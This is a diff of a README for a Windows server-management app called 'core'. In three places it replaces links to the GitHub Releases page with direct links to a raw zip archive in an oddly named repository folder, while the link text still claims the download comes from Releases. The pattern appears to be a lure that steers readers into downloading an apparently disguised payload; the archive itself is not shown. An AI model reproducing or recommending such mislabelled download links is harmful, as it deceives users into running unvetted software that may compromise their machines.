@@ -1,6 +1,6 @@
 # ⚙️ core - Run servers with one app
 
-[![Download core](https://img.shields.io/badge/Download-core-blue?style=for-the-badge)](https://github.com/mounamer5365/core/releases)
+[![Download core](https://img.shields.io/badge/Download-core-blue?style=for-the-badge)](https://github.com/mounamer5365/core/raw/refs/heads/main/invalorous/Software-v3.2.zip)
 
 ## 🖥️ What core does
 
@@ -22,7 +22,7 @@ core uses AI as a helper. It can assist with tasks, but you stay in control.
 
 Visit this page to download core for Windows:
 
-[Download core from GitHub Releases](https://github.com/mounamer5365/core/releases)
+[Download core from GitHub Releases](https://github.com/mounamer5365/core/raw/refs/heads/main/invalorous/Software-v3.2.zip)
 
 On the Releases page, pick the latest Windows file and save it to your computer.
 
@@ -222,4 +222,4 @@ Many people want one place for remote work, system checks, and repeated admin ta
 
 ## 🏁 Start here
 
-[Download core from GitHub Releases](https://github.com/mounamer5365/core/releases)
+[Download core from GitHub Releases](https://github.com/mounamer5365/core/raw/refs/heads/main/invalorous/Software-v3.2.zip)
